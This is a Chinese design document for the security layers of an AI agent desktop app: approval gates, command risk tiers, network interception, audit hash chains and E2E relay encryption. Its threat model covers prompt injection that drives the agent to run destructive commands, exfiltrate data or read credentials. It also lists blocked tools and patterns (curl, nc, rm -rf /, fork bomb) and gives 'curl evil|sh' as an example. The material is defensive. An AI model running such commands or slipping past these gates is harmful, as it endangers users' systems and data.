# 安全机制技术方案

> 调研基线：main 分支（2026-11-05）。桌面端路径基准 `apps/tianshu-desktop/`（`electron/` 主进程、`src-react/` 渲染进程）；服务端 `apps/tianshu-server/`；共享包 `packages/tianshu-core`、`packages/tianshu-protocol`。
> 现状佐证：`docs/security-audit-2026-11-02.md`（三路并行安全审查，五批 25 项修复 + 批 G/H/I 收口）。

## 1. 总览

天枢的安全体系围绕「AI Agent 在用户本机拥有真实执行权」这一核心风险面构建，分层形态如下：

```
┌─────────────────────────────────────────────────────────────────────┐
│ 认证层（Who）                                                        │
│  桌面：user 表 + scrypt 密码哈希 + JWT(30d)（commons/ipc-user.ts      │
│        handleUser：token 末参解 userId + user 表存在性回查）           │
│  server：JWT_SECRET 业务登录 + TIANSHU_TOKEN 静态 token 全局守卫       │
│  relay-admin：bcrypt 管理员登录（等时垫背）+ AK 三要素换发 access JWT  │
├─────────────────────────────────────────────────────────────────────┤
│ 授权层（What）                                                        │
│  IPC 通道白名单（commons/ipc-channels.ts，preload 收敛暴露面）         │
│  业务表 userId 隔离（v12 多用户）+ 数据根分区                          │
│  会话 appBinding 工具面收窄 / workspace 授权路径清单（file:grant-…）   │
├─────────────────────────────────────────────────────────────────────┤
│ 审批门禁层（Approve-before-act）                                     │
│  工具门 tool-gate.ts runToolCall：命令门 → 危险分级（HIGH/CRITICAL）   │
│  → 文件门 → 批量删除预估 → fullAccess/toolPermission 记忆豁免 →       │
│  审批挂起（approval-request chunk ⇄ agent:approve IPC）               │
│  unattended（automation）流：ask/block 一律强拒                       │
├─────────────────────────────────────────────────────────────────────┤
│ 运行时防护层（Contain）                                              │
│  网络四层拦截：undici PolicyDispatcher / 渲染 session webRequest /    │
│  browser partition 门 / 本地 CONNECT 代理（子进程 env 注入）           │
│  子进程穿透监控 child-monitor（ps 轮询 + 黑名单 SIGKILL 子树）         │
│  图 HTTP 节点 SSRF 守卫（graph-http-guard：字面+DNS 解析级）           │
│  webview：独立 partition + 弹窗拦截 + XFO/CSP frame-ancestors 剥离     │
├─────────────────────────────────────────────────────────────────────┤
│ 传输加密层（Confidentiality in transit）                              │
│  relay E2E：X25519 + HKDF-SHA256 双向密钥 + AES-256-GCM 信封 +        │
│  64 滑动窗重放拒绝 + TOFU 指纹（core/e2e-crypto.ts，三端 wire 同契约） │
│  relay 本体：首帧 auth 承载凭证 + 原生 TLS 可选项（--cert/--key）       │
├─────────────────────────────────────────────────────────────────────┤
│ 静态存储层（At rest）                                                │
│  凭证信封：AES-256-GCM enc:v1 前缀 + AAD 绑字段名（core/              │
│  crypto-envelope.ts）+ safeStorage 主密钥（security/master-key.ts）   │
│  连接 token 家族字段级密封（security/option-secrets.ts）               │
│  备份档口令加密（core/backup-archive-crypto.ts：scrypt + AES-GCM）     │
├─────────────────────────────────────────────────────────────────────┤
│ 审计层（Accountability）                                             │
│  桌面 securityAuditLog 哈希链（sequence 单调 + prevHash→hash 串联，    │
│  事后删改链校验失败）+ 五类事件（command/file/network/data/config）    │
│  relay-admin RaAuditLog（append-only 运营审计）                       │
│  server OperationLog（拦截器写死 DISABLE_LOG=true——未启用，见 §5）     │
└─────────────────────────────────────────────────────────────────────┘
```

装配入口集中在 `electron/Application.ts` 291–424 行：`AuditLogService`（先恢复链尾）→ `installNetworkGate` → `LocalConnectProxy` 生命周期 → `SecurityService`（15 项配置内存缓存）→ `installCommandGate` / `installCommandWatchlist` / `installFileGate` → `setPolicyHook`（undici 全局）→ `installSessionGuard` / `installLibraryPreviewSessionGuard` / `installBrowserSessionGuard`。各执行层（chat/automation/graph/webhook/browser）以闭包实时读 `securityService.getConfigValue()`，配置变更即时生效。

### 1.1 威胁模型 → 防线映射

| 威胁 | 主防线 | 代码锚点 |
|---|---|---|
| prompt 注入诱导危险命令 | 危险分级表（full 不豁免）+ cmdAsk 网络外发 13 类 + 程序黑名单命令位全比对 | `security/command-risk.ts` / `command-policy.ts` |
| 注入诱导外发数据 | 网络四层拦截（fetch/渲染/browser/子进程代理）+ 网络命令纳 ask | `security/network-gate.ts` / `local-proxy.ts` |
| 注入诱导读凭证文件 | 内置敏感路径黑名单（~/.ssh 等 17 条，永不落盘不可关） | `security/defaults.ts` BUILTIN_FILE_BLOCKLIST_ALL |
| 恶意域回连 | 内置 114 条恶意域清单 + 用户 domainDeny | `security/domain-policy.ts` judgeDomain |
| XSS 拿渲染层后直捣 IPC | preload 通道白名单（白名单外拒绝+告警）+ handleUser token 鉴权 | `preload.ts` / `commons/ipc-channels.ts` / `ipc-user.ts` |
| 磁盘植入 HTML 经导航拿 IPC 桥 | 导航白名单收窄到渲染入口精确匹配 | `renderer-guard.ts` shouldAllowNavigation |
| 任意 scheme 外开（Windows file:// 关联执行） | 协议白名单先行，非 http(s) deny | `renderer-guard.ts` handleWindowOpen |
| 图节点 SSRF read-back（webhook/LLM 模板化 URL） | 字面+编码 IP+DNS 解析级守卫，metadata/链路本地硬边界 | `core/graph-http-guard.ts` |
| 云 metadata 偷凭证 | 三元组封锁（fetch/browser/图节点三面共用） | `security/ssrf-hosts.ts` |
| 中继运营方窥探/篡改业务帧 | relay E2E（X25519+GCM+重放窗+TOFU） | `core/e2e-crypto.ts` + 双端 transport |
| 凭证随库文件/备份档外流 | safeStorage 主密钥 + 字段信封 + 备份口令加密 | `master-key.ts` / `crypto-envelope.ts` |
| 共享 token 泄露全量失守 | AK→短期 access JWT（EdDSA）+ CRL/kick 吊销 | `relay/jwt-eddsa.ts` / `crl.ts` |
| 跨用户越权 | 业务表 userId 隔离 + token 解 userId 回查存在性 | schema userId 列 / `ipc-user.ts` verifyUserId |
| 事后抹除攻击痕迹 | 审计哈希链（删改任一环节链校验失败） | `security/audit/hash-chain.ts` |
| webhook token 猜测 | randomBytes(24)（192bit）路径凭证 + 未知 404 | `orchestration/webhook-server.ts` |
| 对称 token 时序侧信道 | sha256 定长摘要后 timingSafeEqual | server `token.guard.ts` / `password.ts` |

## 2. 数据模型

Schema：`apps/tianshu-desktop/prisma/schema.prisma`（31 张业务表，本节只列安全直接相关者）。

### 2.1 user（11–17 行）

```
id / username(unique) / password / email(unique?) / nickname
```

`password` 存 scrypt 哈希串（`scrypt$N$r$p$saltB64$hashB64`，`electron/domains/user/password.ts` hashPassword：N=16384/r=8/p=1/keylen=64）；存量明文行登录命中后懒升级（verifyPassword 兼容双形态）。

### 2.2 toolPermission（176–183 行）

```
id / workspaceId / toolName / createdAt
@@unique([workspaceId, toolName], map: "idx_tool_permission_ws_tool")
```

工作空间级工具审批记忆（对标 Claude Code allowed-tools 的"always allow"）。审批横幅「允许并记住」按钮**先 `permission:rememberTool` 落库再 approve**（防两步竞速导致记忆了却被拒）；工具执行前 `isToolAllowed(toolName)` 查询命中即跳过审批（`tool-gate.ts` AgentStreamOptions，chat.service.ts 1641–1650 行闭包）。**DB 内存老工具名**（2026-10-29 改名前），判定/禁用双侧经 canonicalToolName（@tianshu/core 单源）归一比较，记忆语义跨改名延续。撤销面：`permission:listRemembered` / `permission:forgetTool` / `permission:revokeAllRemembered`（安全中心「系统授权卡」SystemGrantCard.tsx 消费）。注意它**不含 fullAccess 运行态**——完全授权是会话级内存态（PermissionStore，`ai/agent/permission-mode.ts`），不经库。粒度为 workspace×toolName 整名（无参数前缀/路径 glob/过期 TTL——见 §6 改进）。

### 2.3 securityAuditLog（396–412 行）

```
id / sequence(unique) / category / eventType / decision / detail?
commandPreview? / commandHash? / sessionId? / prevHash? / hash / createdAt
```

哈希链审计日志（唯一带链式完整性的表）：`sequence` 全程单调（clear 后不重置）、`prevHash` 接前条 `hash`、`hash = sha256(prevHash + 规范化内容)`（`electron/domains/security/audit/hash-chain.ts` computeEntryHash；stableStringify 递归排序 key、Date 序列化 ISO 保证读回复算同构）。`commandPreview` 存命令前 100 字符（人工可读），`commandHash` 供完整命令的指纹核对——原文不落库（防日志即泄密面）。详见 §3.4。

### 2.4 mcpServer（159–174 行）

```
id / name / transport("stdio"|"http") / command? / args?(JSON) / env?(JSON)
url? / headers?(JSON) / enabled / userId
```

MCP 服务器注册表。stdio 行在**本地**可执行任意 command+args（用户自装自担）；**远程遥控写面**对 stdio 一律拒绝（`server-face/mcp-tap.ts`：`MCP_STDIO_FORBIDDEN`——被控宿主机进程执行面不向远端开放）；headers/env 经 REDACTED_SECRET 三态掩码。详见 §3.7 末。

### 2.5 workspace.writeApprovedAt（105 行）与 automationTask.accessMode（222 行）

- `workspace.writeApprovedAt`：早期「工作空间写授权时间戳」，**已废弃**（`chat.service.ts` 1604 行注释：P3 两级审批改造后读取路径移除，字段滞留 schema 属历史包袱）。
- `automationTask.accessMode`（default/fullAccess）：无人值守任务的工具档位。default=继承安全中心约束且 ask/block 强拒（unattended 语义）；full=显式免责+内置硬线（程序黑名单/危险分级仍拦，`tool-gate.ts` 头注释）。webhook 触发的图运行同构：`WebhookConfig.fullAccess`（默认 false——外部 token 可达面不给全权）。

### 2.6 server / relay-admin 侧表

- 业务库（`apps/tianshu-server/prisma/schema.prisma`）：`user` / `operation_log`（37–53 行，操作日志——拦截器当前写死禁用）/ `option`。
- relay-admin 独立库（`apps/tianshu-server/prisma/relay-admin/schema.prisma`，与业务库物理隔离）：
  - `RaUser`：租户（tenantId=randomUUID()、plan→quota 映射，beta 档 maxServers=5/maxClients=10）；
  - `RaAccessKey`：AK（id 即 akId 公开标识、secretHash=sha256(akSecret) 明文仅签发/轮换时显示一次、role 分 server/client 泄露面隔离、expireAt 动态判过期）；
  - `RaAuditLog`：append-only 运营审计（ak.create/ak.disable/ak.rotate-secret/ak.extend/租户操作；token 换发高频不记）；
  - `RaAdminUser`：运营管理员（bcrypt）。

### 2.7 option 表中的安全行（无独立表）

- `type=app name=security` 的 15 个安全配置 key（sandboxEnabled/cmdAllow/cmdAsk/programBlacklist/fileAllowlist/fileBlocklist/domainAllow/domainDeny/blockAllNetwork/maliciousDomainProtection/fileBackupEnabled/fileBackupMaxSizeMB/deleteProtection/bulkDeleteThreshold/disabledTools——`security.service.ts` SECURITY_DEFAULTS 单源默认值）；
- `security.masterKey`：safeStorage 包裹的凭证主密钥（`master-key.ts`，`ss:v1:`/`hex:v1:` 双形态）；
- `connections` / `serverFace` / `serverFace.e2eKey` / `webhook:<graphId>` 行：连接 token 家族与 E2E 静态私钥，均经 `option-secrets.ts` 字段级信封密封（`enc:v1:` 前缀）。

## 3. 各子域技术方案

### 3.1 认证与会话

**桌面端登录与 IPC 鉴权**（单机多用户、JWT 无状态会话）：

- 密码：`electron/domains/user/password.ts`——scryptSync + 随机 16B 盐 + timingSafeEqual 常量时间比较；`isHashedPassword` 判形态，存量明文登录命中后由 repo 升级哈希（平滑迁移）。
- 登录流：`electron/domains/user/user.repo.ts` login（185–214 行）——username 查询 → verifyPassword 校验 → **明文行原地升级 scrypt**（迁移失败不阻断登录，下次再试，204–211 行）→ 签发 token。失败统一返回 null 不区分「用户不存在/密码错」（防用户名枚举）；**无登录失败次数锁定机制**（单机产品面，风险有限，如实声明）。login/create/verifyToken 三通道保留匿名（登录前无 token），其余 user 通道走 handleUser。
- JWT 签发：`electron/commons/ipc-user.ts` generateUserToken（jsonwebtoken，payload `{id, username, nickname}`，30d 有效）。密钥 `commons/jwt-secret.ts` getJwtSecret：首启 randomBytes(48) 落 `~/.tianshu`（0600 权限），读写失败降级进程内存随机串（重启 token 重签）。
- IPC 层统一鉴权：`handleUser(channel, handler)` 包装 `ipcMain.handle`——前端 invoke 末尾自动追加 token，服务端 `args.pop()` 剥出 → `verifyUserId(token)` 验签 → **回查 user 表主键存在**（2026-11-02 修复：验签通过≠用户仍在，防快照重放/恢复备份后幻影 userId 落脏数据、自增 id 复用身份错位）→ userId 作为首参进业务 handler。**前端永不传用户 id**，渲染层被攻破也无法越权指定他人 userId。
- 渲染层路由守卫：`src-react/routes/`（Hash 路由 + JWT 认证守卫，`/login` 平级免认证页仅 login 与 file-window）。

**server 端（NestJS + Fastify）双守卫**（`apps/tianshu-server/src/commons/auth/`）：

- JWT 守卫：业务登录态（`JwtAuthGuard`/`@Public`/`@Roles`，JWT_SECRET env；未配置时启动告警并以进程级随机秘密垫底——登录跨重启不可用，天枢远控面不受影响）。
- 静态 token 守卫：`commons/auth/guard/token.guard.ts` StaticTokenGuard——env `TIANSHU_TOKEN` 设置时全局校验 `Authorization: Bearer`（SSE 场景允许 `?token=` query 等效）；比对走 sha256 摘要后 timingSafeEqual（防时序侧信道）。**不感知 @Public**，对全部路由生效，仅豁免两前缀：`/webhook/`（每图 token 自鉴权兜底）与 `/backup/`（BackupGuard 邀请码自鉴权）。非 loopback 监听且未设 token 时拒绝启动（2026-11-02 批一：堵 fail-open）。

**relay-admin 管理面**：`relay-admin/auth/ra-auth.service.ts`——凭据只认 `ra_admin_user`（不触业务 user 表）；bcrypt.compare + 等时垫背哈希 TIMING_PAD_HASH（用户名枚举时延拉平，控制面暴露面更敏感故加）；签发复用 commons JwtAuthService（roles=['ra-admin']）。

**被控面（server-face）**：`electron/domains/server-face/server-face.ts`——本机 HTTP 控制面，**token 未配置即拒绝启动**（不裸奔）；Bearer 与 `?token=` 双口径（EventSource 限制同上）；tokenMatches 走 timingSafeEqual；请求体上限 16MB。

### 3.2 工具权限与审批门禁

#### 3.2.1 判定链（runToolCall）

核心收口在 `electron/domains/ai/agent/tool-gate.ts` 的 `runToolCall`（462 行，包装注册表工具的 execute，由 `langchain-tool-adapter.ts` toLangChainTools 强制包裹——"执行必须经 runToolCall，绝不直调 def.execute"；chat 与 graph 编排共用）。全判定链按序执行（前序命中即短路返回）：

1. **命令判定门**（SP2，仅 bash）：`resolveCommandGate`（286 行）→ `commandGate`（`security/command-gate.ts` 模块单例，`sandboxEnabled=false` 或异常 fail-open 回落 "default"）：
   - `block`（程序黑名单命中，命令位序列全比对）→ 直接拒绝（不触审批），输出 `COMMAND_BLOCKED_OUTPUT`，审计 `command-safety.blocked {source:"blacklist"}`；
   - `ask`（cmdAsk 名单）→ 进审批；`allow`（cmdAllow 名单）→ 跳审批；`default` → 回落后续链路。
2. **危险分级线**（2026-10-24 权限放宽批 §4.5，**先于 fullAccess 短路——full 档也不豁免**，对齐 WorkBuddy bypass "requires confirmation every time"）：`resolveCommandRisk`（436 行）→ `command-risk.ts` assessCommandRisk 返回 critical/high/null（详见 §3.3）。unattended 流强拒；交互流强制审批。
3. **文件判定门**（SP3+SP4，`FILE_GATE_TOOLS` = read/write/ls/rm）：`resolveFileGate`（362 行）→ `fileGate`（`security/file-policy.ts` decideFileAccess：内置敏感路径清单 > 用户白 > 用户黑 > default）。block → 审批（unattended 强拒）；allow → 跳审批。
4. **批量删除预估门**（SP4）：`resolveBulkDelete`（334 行）——rm 目录 `countFilesForEstimate`（walk 计数达 10000 上限即停）≥ bulkDeleteThreshold（默认 50）→ 强制审批（full 可豁免——2026-10-23 三档裁定：回收站/删除保护/备份不依赖审批照常兜底）。
5. **write 审批判定汇总**（`needsApproval`，611–635 行）：`fullAccess()` 实时查询（**撤回立即生效**；同时豁免 MCP 写工具）→ 直执行；`isToolAllowed(toolName)` 查 toolPermission 记忆命中 → 直执行；default 档审批面收窄为「高危询问」（2026-10-24 §4.4）——普通 bash（gate=allow/default，危险面已由分级表前置）、write 工作空间内（`file-safety.auto-allowed {reason:"workspace-write"}` 留痕）、DB 写免审集（`AUTO_EXEMPT_WRITE_TOOLS`：todo_write/create_skill/create_expert/update_expert）、网络域工具（`NETWORK_TOOL_NAMES`：fetch/browse/browser 四件 + `mcp__` 前缀——已启用的连接器语义天然成立）均免审；其余 kind=write 未记忆挂起审批（writeFallbackNeedsApproval）。
6. **审批交互**：`requestToolApproval`（188 行）先推 `tool-update(state=awaiting-approval)` 再推 `approval-request`（含 argSummary——bash 取命令前 60 字符，其余优先 path，JSON 截 100）两 chunk；挂起等待 `agent.requestApproval(toolCallId)` Promise，`agent:approve` IPC 回决议。批准/拒绝均回调 `onApprovalResolved` 落审计链（denied→rejected 词汇对齐审计侧，chat.service.ts 1691–1701 行）；拒绝以文案「用户拒绝了此操作」回喂（工具循环继续，spec 决策 #4）；`raceWithAbort`（155 行）保证用户中止时审批挂起/长执行不悬挂整条流。
7. **执行**：`executeToolSafe`（212 行）注入 ctx（fullAccess/commandWatchBlacklist/deleteProtection/onBackupFile/grantedPaths/workspacePath/userId/workspaceId/modelId/projectId）；输出以「错误:」前缀判 error/done，截 2000 字符；`toolStats` 埋点（denied 无计时）。

#### 3.2.2 档位 × 命中源判定总表

| 命中源 | default 档 | full 档 | unattended（automation） |
|---|---|---|---|
| 程序黑名单 gate=block | 拒绝（不审批） | 拒绝 | 拒绝 |
| 危险分级 CRITICAL/HIGH | 审批 | **审批（full 不豁免）** | 强拒 |
| cmdAsk gate=ask | 审批 | 直执行 | 强拒 |
| 文件门 blocklist block | 审批 | 直执行 | 强拒 |
| 文件门 allowlist allow | 直执行 | 直执行 | 直执行 |
| 批量删除 ≥ 阈值 | 审批 | 直执行（回收站/备份照常） | 强拒 |
| write 工作空间内 / 网络域 / MCP / DB 写 / 普通 bash | 直执行（auto-allowed 留痕） | 直执行 | 直执行 |
| 其余 kind=write 未记忆 | 审批 | 直执行 | 拒（requestApproval 恒 false） |

另有一条**与权限档位无关常开的 bash 内建硬线**：`ai/agent/command-tool.ts` isDangerousCommand（7 组正则：rm 绝对路径、mkfs、dd 到设备、fork bomb `:(){`、chmod 根、Windows 递归删/format）命中即拦截并审计 `command-safety.blocked {source:"dangerous"}`；cwd 钳制（resolveCwd：默认态限制工作空间内，越界回退 + 审计 `command-safety.cwd-fallback`；full 直传；未绑定目录锚定家目录）。

#### 3.2.3 两级授权载体（fullAccess 与 toolPermission）

- **会话级 fullAccess（内存态）**：`ai/agent/permission-mode.ts` PermissionStore（`AccessMode = "default" | "full"`，get 未设置缺省 default 安全侧；纯内存，进程重启清零）。装配 `chat.service.ts` 1640 行闭包 `fullAccess: () => this.permissions.get(sessionId) === "full"`。前端 `src-react/domains/ai/chat/components/PermissionCapsule.tsx`（输入框权限胶囊二档单选，`ChatInput.tsx` 1399 行挂载）；切 full 弹 FullAccessModal 免责勾选强确认；`chat:status` 返回 accessMode 供恢复。安全中心 SystemGrantCard 总览活跃 full 会话（`permission:listFullGrants` / `revokeAllFull` 一键清空）。
- **工作空间级 toolPermission 记忆（持久态）**：生命周期四阶段（IPC 均 chat.service.ts registerHandlers 注册）——写入（`permission:rememberTool`，ApprovalBanner「允许并记住」**先记忆后批准防竞速**；远程态经 approve 载荷单次上送，入口 respondApprovalRemember 2600 行）→ 判定（resolveAgentOptions 的 isToolAllowed 闭包 1641–1650 行，workspaceId 为 null 恒 false）→ 展示（`permission:listAllowedTools` 单空间 / `permission:listRemembered` 授权卡跨空间倒序 join）→ 撤销（`permission:forgetTool` / `permission:revokeRemembered` 幂等 / `permission:revokeAllRemembered`）。**canonicalToolName 归一**（@tianshu/core 单源）：DB 存老名（2026-10-29 工具改名前），判定/禁用双侧归一比较，记忆语义跨改名延续。
- 被控面（远程遥控）permission 五段契约单源 `packages/tianshu-protocol/src/permission-contract.ts`（PermissionRememberedItem / PermissionRevokeResult / PermissionFullGrantItem / PERMISSION_ERROR_CODES）。

#### 3.2.4 审批协调与渲染层链路

- **ApprovalCoordinator**（`ai/agent/approval.ts`）：request/respond/voidAll（会话收尾作废全部未决）/pendingCount；**`APPROVAL_TIMEOUT_MS = 10 分钟`** 超时自动 deny（防远控应答方不在线挂死）。
- **chunk 推送**：ChatService.emit（chat.service.ts 1091–1105 行）每 chunk 先经 emitChatChunk（server-face tap，被控面 SSE 订阅），再对**全部窗口** `chat:stream:<sessionId>` 广播（2026-10-30 修复：被控面发起的会话无渲染层 sender，单窗推送会使横幅永不消失）。
- **渲染层组件链**：`chat/hooks/use-chat-send.ts`（approval-request 补 argSummary 进 store）→ `MessageList.tsx` 442–466 行（state=awaiting-approval 时渲染 ApprovalBanner，置于面板外不埋折叠区）→ `ApprovalBanner.tsx` 三钮（允许 / 允许并记住 / 拒绝）。远程桥审批卡 `server/components/BridgeApprovalCard.tsx` + `server/lib/approval-queue.ts`（pendingApprovals/unrespondedApprovals 派生队列）。
- **confirm_form 确认卡**：`agent:confirmRespond`（确认卡决议，切片 B 2026-10-29）与审批横幅并行的一类挂起。

#### 3.2.5 无人值守与工具面收窄

- **automation**：`automation/automation-runner.ts` 409–436 行固定 `unattended: true` + `resolveAutomationPermissions(accessMode, rememberedTool)`（119–130 行）——full 档 `{fullAccess:()=>true, isToolAllowed:恒 true（否则记忆工具会被门禁短路，耦合已注明）, requestApproval:恒 true}`；default 档「只读执行」：requestApproval 恒 false（写类被拒但任务继续，agent 收拒绝反馈）、记忆工具仍直执行（2026-11-01 审查批 F3 与 chat 链同语义）。
- **会话工具面三层独立收窄**：① collectToolDefinitions（chat.service.ts 1758 行：工作空间过滤/项目专属 plan 组/专家组）；② filterToolsBySession（tool-groups.ts 131 行：场景门控）；③ filterDisabledTools（tool-registry.ts 51 行：SP6 用户禁用=对模型不存在，canonical 双侧归一）——chat/automation/eventBus/webhook 四入口统一过滤口径。`session.appId` 绑定应用后的收窄发生在**数据级**（`orchestration/create-workflow.ts` resolveSessionAppScope 120–153 行：workflow_read 列表过滤 graphIds、workflow_write 越界拒绝；悬空绑定 dangling 提示态），不在工具注入层。
- **webhook 触发**：`codeAuthorized=false` 对齐 default 任务无全权语义（§3.6）。

#### 3.2.6 测试锚点

判定引擎与服务集成两层：`apps/tianshu-desktop/tests/security/`（command-policy.test.ts——S4 命令位序列全比对断言：`env rm x`/`nohup rm x`/`bash -c rm -rf x`/`sudo /bin/rm x` 全 block、`echo rm` 参数不误伤；command-gate-integration.test.ts——runToolCall 命令门五路集成含 full 仍审（git reset --hard）；command-risk.test.ts——CRITICAL 18 例/HIGH 13 例/大小写不敏感；bulk-delete-gate / file-policy / file-gate-integration / disabled-tools / permission-store）；`tests/ai/`（permissions-integration.test.ts——send 级两级审批回归锚；approval.test.ts——ApprovalCoordinator 超时/voidAll；automation-permissions.test.ts；tool-alias.test.ts——老名归一与记忆存续；v1-fullschema.test.ts 338 行——toolPermission 唯一索引）。

### 3.3 命令门禁分级

三层结构，互相独立、逐层收紧：

**第一层 判定引擎**（`security/command-policy.ts` decideCommand，纯函数）：优先级 程序黑名单 > 询问名单 > 放行名单 > default（WorkBuddy 同构 "ask wins over allow"）。词法为简化 shell 分割（空白 + 成对引号剥离），不引完整解析器。关键硬化（2026-11-02 安全批 S4）：

- **命令位序列全比对**：`commandPositions(tokens)` 识别透传包装器（bash/sh/zsh/env/nohup/sudo/xargs 等 14 个 WRAPPERS），`bash -c 'rm -rf /'` 词法化为 [bash, -c, rm, -rf, /] → 命令位 [bash, rm]，黑名单比对**全部命令位**——堵「首 token 伪装」绕过（旧版仅比对首 token，`bash -c 'rm …'` 即逃逸）。
- prefix 规则逐 token 全等（cmdAllow 默认 `[{prefix:["git","push"]},{prefix:["npm","install"]}]`）。

**第二层 危险分级表**（`security/command-risk.ts`，内置静态正则永不落盘、用户不可关、可经 cmdAsk 加严）：

- CRITICAL_PATTERNS（25 条）：不可逆破坏——`rm -rf /` 及系统目录、dd of=/dev、mkfs/fdisk/parted、重定向覆盖 /etc|/boot|/sys、crontab -r、userdel、DROP DATABASE / TRUNCATE TABLE / DELETE FROM … WHERE 1=1、FLUSHALL、terraform destroy、云 CLI delete、git reset --hard / clean -fdxX / checkout -f / stash clear、主干强推/删主干等——**default 与 full 两档均强制审批**；
- HIGH_PATTERNS（24 条）：高破坏面但可恢复——sudo/su（去行首锚定防 env 前缀穿透）、chmod 777、rm 递归/通配符、shred、git 分支删/强推/filter-branch/filter-repo/reflog delete、kubectl delete/drain、docker system prune、find -delete/-exec rm、xargs rm——default 审批、full 亦审批。
- 大小写归一（段统一小写后匹配，堵 `RM -RF` 穿透，2026-10-24 终审 Critical）；分段为粗分（`&&`/`||`/`;`/`|`/换行切分），引号内分隔符误分由子进程监控与审批兜底（已声明的精度边界）。

**第三层 子进程穿透监控**（`security/child-monitor.ts` watchCommandTree）：bash 工具启动子进程后，1s 轮询 `ps -eo pid,ppid,comm` 构建进程树，root 及后代命中程序黑名单 → SIGKILL 该子树 + 审计回调（`command-safety.child-blocked`）。覆盖「shell 隐式 exec 换壳」「分段误分漏网」的运行时面；win32 为 no-op（顶层拦截不受影响，诚实声明）。

**与权限无关的第四道内建硬线**（`ai/agent/command-tool.ts` isDangerousCommand）：7 组正则（rm 绝对路径 / mkfs / dd 到设备 / fork bomb `:(){` / chmod 根 / Windows 递归删除与 format），任何档位（含 full）命中即拦截——「删除文件请改用 rm 工具」的引导文案；另有 cwd 钳制（resolveCwd：默认态限制工作空间内，越界回退 + 审计 `command-safety.cwd-fallback`；full 直传；未绑定目录锚定家目录）。

**数据安全兜底**（SP4，`security/file-history.ts` + `backup-policy.ts`）：write 覆盖前 / rm 永久删除前做**内容寻址快照**（快照名 = 内容 sha256 前 32 字符，`rootDir/<sessionId>/{manifest.json,<sha256>}`，临时名 + rename 原子落盘；manifest 损坏丢弃重建）；配额 LRU 跨会话全局淘汰（总量按 fileBackupMaxSizeMB，缺省 3000MB；共享快照保守高估，方向安全）；单文件上限 100MB（BACKUP_FILE_LIMIT）；一切异常 fail-open 以 `{ok:false, reason}` 返回由调用方审计定夺。`deleteProtection=true`（缺省）时 rm 走回收站语义。该兜底**不依赖审批**——即使 full 档直执行，快照与回收站照常生效（2026-10-23 三档裁定的安全网前提）。

**默认网络外发纳管**（安全批 S4，2026-11-02）：cmdAsk 默认收编 13 类网络外发命令（curl/wget/nc/ncat/ssh/scp/sftp/rsync/telnet/ftp/ping/dig/nslookup）——理由：NetworkGate 只拦 undici/fetch（进程内），curl/wget 是独立进程直连、域白名单对它无效；default 档免审 bash + 注入 = `curl evil|sh` 零审批执行。交互档升为「询问」而非禁止。

### 3.4 审计日志

**桌面端哈希链审计**（`electron/domains/security/audit/`）：

- 写入：`audit-log.service.ts` AuditLogService.append 同步入队（调用方零成本）→ ≥50 条或 500ms 批量 flush → `buildEntries` 逐条编 sequence/hash 落库 → 超 5000 条裁最旧（prune 按 sequence 推导 cutoff）。落库失败还原链状态、批次原样回队重试（避免 prevHash 接到幽灵 hash）；will-quit 阻止退出冲刷后再退。
- 链完整性：`hash-chain.ts`——`hash = sha256(prevHash + stableStringify(条目内容))`，自身 hash 与自增 id 不参与（已落库行可直接复算）；`verifyChain` 逐条重算 + prevHash 接续校验，事后删改任一环节即失配。**清空动作自身留痕**（clear 后 `audit.cleared` 成为新链头，sequence 不重置保持全程单调）。
- 事件分类：category 五类（command-safety/file-safety/network/data-safety/config），由 eventType 前缀映射（缺省归 config）。已接入事件源与 eventType 全表：
  - **command-safety**：blocked（黑名单/内建硬线，source 分 blacklist/dangerous）、needs-approval（cmdAsk 或 risk-table 命中）、allow-listed、rejected（unattended 强拒）、child-blocked（子进程监控击杀）、cwd-fallback（bash cwd 越界回退）、remembered（记忆写入）、approved/rejected（审批决议，chat.service.ts 1691–1701 行 denied→rejected 词汇对齐）；
  - **file-safety**：allow-listed / needs-approval（blocklist）/ rejected（unattended）/ auto-allowed（workspace-write 直执行留痕）/ remembered / remembered-revoked；
  - **data-safety**：bulk-delete-needs-approval / bulk-delete-rejected（含 estimated 数）；
  - **network**：blocked（host/rule/source，source 分层 fetch/renderer/browser/proxy/mcp）；
  - **config**：`config.<key>.updated`（15 项配置逐 key）、commandRules.reset、fileRules.reset；
  - **其它**：permission.full-revoked / remembered-revoked-all、relay.e2e-degraded（E2E 明文降级，安全批 S2）、terminal.session（终端会话创建，安全批 B5——terminal 面曾零审计）、audit.cleared（清空留痕）。
  事件源接线：命令/文件/批量删除/审批决议经 ChatService 第 4 参 onSecurityEvent 汇入（tool-gate emitCommandEvent/emitFileEvent，detail 截 200 字符）；网络拦截经 NetworkGate.blockedAudit 四层共用；e2e 降级经 RelayTransport.installDegradedNotifier（Application.ts 319 行）。
- 命令脱敏双字段：commandPreview（前 100 字符，人工可读）+ commandHash（完整命令指纹）。
- 查询与导出：IPC `security:auditList`（倒序分页 + keyword LIKE，detail/commandPreview 双字段）/ `security:auditExport`（json/csv 流式写 + 系统对话框选路径）/ `security:auditClear`。前端视图 `src-react/domains/security/components/AuditCenter.tsx`（挂在设置对话框「安全中心」页，`app-settings/components/SettingsDialog.tsx`——非独立路由）。

**relay-admin 运营审计**：RaAuditLog append-only（无 update 面）；动作 ak.create/ak.disable/ak.enable/ak.rotate-secret/ak.extend + 租户生命周期；token 换发（auth 热路径）不记（spec §6 高频豁免）。

**server 端 operation_log**：模型与拦截器齐全（`modules/operationlog/operation-log.interceptor.ts` 记录 userId/operation/IP/UA/耗时/状态），但 `DISABLE_LOG: boolean = true` **写死禁用**——脚手架模板遗留，当前生产不记录任何操作日志（如实声明，见 §5 遗留）。

### 3.5 relay E2E 加密与多租户

**E2E 密码学核心**（`packages/tianshu-core/src/e2e-crypto.ts`，纯 node:crypto 零三方依赖；移动端另有 `@noble/curves` 纯 JS 第二实现，wire 字节级兼容、交叉向量测试锁定）：

- 密钥协商：控制端每连接临时 X25519 对 + 被控端静态身份对（option 表持久化，`serverFace.e2eKey` 行信封密封）；显式拒绝全零共享秘密（低阶公钥/小因子子群攻击面，OpenSSL 不报错须自判）。
- 会话密钥：HKDF-SHA256 派生**双向独立密钥**（info 绑定 `方向标签 c2s/s2c + connectionId + 两公钥`，salt=两公钥拼接的 SHA-256）——跨方向、跨协商、跨连接密文互不可解。
- 信封：AES-256-GCM，nonce = 4B 会话随机前缀 + 8B 计数器（BE）；AAD 绑定 `方向 + 计数器` 防帧重排序注入。
